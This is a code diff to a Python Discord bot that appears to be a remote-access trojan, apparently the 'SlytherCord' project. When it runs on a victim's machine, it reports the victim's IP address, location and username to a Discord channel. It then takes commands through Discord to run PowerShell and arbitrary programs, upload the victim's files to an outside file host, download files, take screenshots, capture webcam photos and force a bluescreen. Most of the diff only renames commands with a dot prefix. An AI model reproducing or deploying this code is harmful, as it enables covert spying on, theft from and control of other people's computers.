@@ -91,11 +91,27 @@ async def on_ready():
     guild = client.get_guild(int(guild_id))
     mac_address = str(get_mac())
     channel = await find_channel_by_name(guild, mac_address)
-    if not channel:
+    if channel:
+        embed=discord.Embed(title="**Connection Reestablished with: ** ```" + username +"```",colour=0x3)
+        embed.set_author(name="STAR THIS PROJECT ON MY GITHUB NOW!", url="https://github.com/isaaclins/SlytherCord",icon_url="https://cdn.discordapp.com/attachments/1114528537093865494/1128962359562621009/ogkush.png")
+        embed.add_field(name="**IP Adress:**",value=f"```{ip_address}```",inline=True)
+        embed.add_field(name="**Country:**", value=f"```{country}```",inline=True)
+        embed.add_field(name="ㅤ", value="ㅤ",inline=True)
+        embed.add_field(name="**Latitude:**", value=f"```{latitude}```",inline=True)
+        embed.add_field(name="**Longitude**",value=f"```{longitude}```",inline=True)
+        embed.add_field(name="ㅤ", value="ㅤ",inline=True)
+        embed.add_field(name="**City:**",value=f"```{city}```",inline=True)
+        embed.add_field(name="**Username:**",value=f"```{username}```",inline=True)
+        embed.set_image(url="https://cdn.discordapp.com/emojis/962763241170284554.gif?size=128&quality=lossless")
+        embed.set_thumbnail(url="https://cdn.discordapp.com/emojis/824891158936682506.gif?size=128&quality=lossless")
+        embed.set_footer(text="Made by: Isaaclins",icon_url="https://cdn.discordapp.com/emojis/696329906749177856.gif?size=128&quality=lossless")
+        message = await channel.send(embed=embed)
+        await message.pin()
+    else:
         print("Channel with name {} does not exist. Creating...".format(mac_address))
         channel = await guild.create_text_channel(mac_address)
         embed = discord.Embed(title="**Established connection**",colour=0x36393f, timestamp=datetime.now())
-        embed.set_author(name="**STAR THIS PROJECT ON MY GITHUB**", url="https://github.com/isaaclins/SlytherCord",icon_url="https://cdn.discordapp.com/attachments/1114528537093865494/1128962359562621009/ogkush.png")
+        embed.set_author(name="STAR THIS PROJECT ON MY GITHUB NOW!", url="https://github.com/isaaclins/SlytherCord",icon_url="https://cdn.discordapp.com/attachments/1114528537093865494/1128962359562621009/ogkush.png")
         embed.add_field(name="**IP Adress:**",value=f"```{ip_address}```",inline=True)
         embed.add_field(name="**Country:**", value=f"```{country}```",inline=True)
         embed.add_field(name="ㅤ", value="ㅤ",inline=True)
@@ -105,12 +121,12 @@ async def on_ready():
         embed.add_field(name="**City:**",value=f"```{city}```",inline=True)
         embed.add_field(name="**Username:**",value=f"```{username}```",inline=True)
         embed.add_field(name="ㅤ", value="ㅤ",inline=True)
-
-
         embed.set_image(url="https://cdn.discordapp.com/emojis/962763241170284554.gif?size=128&quality=lossless")
         embed.set_thumbnail(url="https://cdn.discordapp.com/emojis/824891158936682506.gif?size=128&quality=lossless")
-        embed.set_footer(text="Example Footer",icon_url="https://cdn.discordapp.com/emojis/696329906749177856.gif?size=128&quality=lossless")
-        await channel.send(embed=embed)
+        embed.set_footer(text="Made by: Isaaclins",icon_url="https://cdn.discordapp.com/emojis/696329906749177856.gif?size=128&quality=lossless")
+        message = await channel.send(embed=embed)
+        await message.pin()
+        
     
 
         
@@ -122,15 +138,15 @@ async def on_message(message):
         if message.channel.name == str(get_mac()): 
             
 
-            if message.content == "help" or message.content == "Help":
+            if message.content.lower() == ".help":
                 embed = discord.Embed(title="Help", description=f"```{commands}```", color=0xfafafa)
                 await message.reply(embed=embed)
 
-            if message.content == "ping" or message.content == "Ping":
+            if message.content.lower() == ".ping":
                 embed = discord.Embed(title="Ping", description=f"```{round(client.latency * 1000)}ms```", color=0xfafafa)
                 await message.reply(embed=embed)
 
-            if message.content.startswith("cd") or message.content.startswith("Cd"):
+            if message.content.lower().startswith(".cd"):
                 directory = message.content[3:]
                 try:
                     os.chdir(directory)
@@ -142,15 +158,15 @@ async def on_message(message):
                     embed = discord.Embed(title="Error", description=f"```Directory Not Found```", color=0xfafafa)
                 await message.reply(embed=embed)
 
-            if message.content == "ls" or message.content == "Ls":
+            if message.content.lower() == ".ls":
                 files = "\n".join(os.listdir())
                 if files == "":
                     files = "No Files Found"
                 embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
                 await message.reply(embed=embed)
 
-            if message.content.startswith("download") or message.content.startswith("Download"):
-                file = message.content[9:]
+            if message.content.lower().startswith(".download"):
+                file = message.content[10:]
                 try:
                     link = requests.post("https://api.letsupload.cc/upload", files={"file": open(file, "rb")}).json()["data"]["file"]["url"]["full"]
                     embed = discord.Embed(title="Download", description=f"```{link}```", color=0xfafafa)
@@ -159,16 +175,16 @@ async def on_message(message):
                     embed = discord.Embed(title="Error", description=f"```File Not Found```", color=0xfafafa)
                     await message.reply(embed=embed)
 
-            if message.content.startswith("upload") or message.content.startswith("Upload"):
-                link = message.content[7:]
+            if message.content.lower().startswith(".upload"):
+                link = message.content[8:]
                 file = requests.get(link).content
                 with open(os.path.basename(link), "wb") as f:
                     f.write(file)
                 embed = discord.Embed(title="Upload", description=f"```{os.path.basename(link)}```", color=0xfafafa)
                 await message.reply(embed=embed)
 
-            if message.content.startswith("shell") or message.content.startswith("Shell"):
-                command = message.content[6:]
+            if message.content.lower().startswith(".shell"):
+                command = message.content[7:]
                 output = subprocess.Popen(
                     ["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
                 ).communicate()[0].decode("utf-8")
@@ -177,21 +193,21 @@ async def on_message(message):
                 embed = discord.Embed(title=f"Shell > {os.getcwd()}", description=f"```{output}```", color=0xfafafa)
                 await message.reply(embed=embed)
 
-            if message.content.startswith("run") or message.content.startswith("Run"):
-                file = message.content[4:]
+            if message.content.lower().startswith(".run"):
+                file = message.content[5:]
                 subprocess.Popen(file, shell=True)
                 embed = discord.Embed(title="Started", description=f"```{file}```", color=0xfafafa)
                 await message.reply(embed=embed)
 
-            if message.content.startswith("exit"):
+            if message.content.lower() == ".exit":
                 await message.channel.delete()
                 await client.close()
             
-            if message.content == "start":
+            if message.content.lower() == ".start":
                 await message.reply("Ok Boss")
 
                 
-            if message.content.lower() == "blue":
+            if message.content.lower() == ".blue":
                 new_msg = await message.reply("Are you sure you want to start a bluescreen?")
                 await new_msg.add_reaction("✅")
                 await new_msg.add_reaction("❌")
@@ -220,7 +236,7 @@ async def on_message(message):
                     await message.channel.send("You didn't react in time.")
                
 
-            if message.content.startswith("screenshot"):
+            if message.content.lower() == ".screenshot":
                 screenshot = pyautogui.screenshot()
                 path = os.path.join(os.getenv("TEMP"), "screenshot.png")
                 screenshot.save(path)
@@ -229,21 +245,17 @@ async def on_message(message):
                 embed.set_image(url="attachment://screenshot.png")
                 await message.reply(embed=embed, file=file)
 
-            if message.content == 'photo':
+            if message.content.lower() == '.photo':
                 webcam = VideoCapture(0, CAP_DSHOW)
                 result, image = webcam.read()
                 imwrite('webcam.png', image)
                 await message.channel.send(embed=discord.Embed(title=' `[Image of User with ID:' +str(get_mac())+'`]' ).set_image(url='attachment://webcam.png'), file=discord.File('webcam.png'))
                 subprocess.run('del webcam.png', shell=True)
                 
-            if message.content == 'purge':
+            if message.content.lower() == '.purge':
                 await message.reply('Purging...')
                 await message.channel.purge(limit=None)
         else:
             print("MESSAGE SENT WAS:", message.content, "BY :" , message.author,"IN :" , message.channel,)
 
-
-    
 client.run(bot_token)
-
-
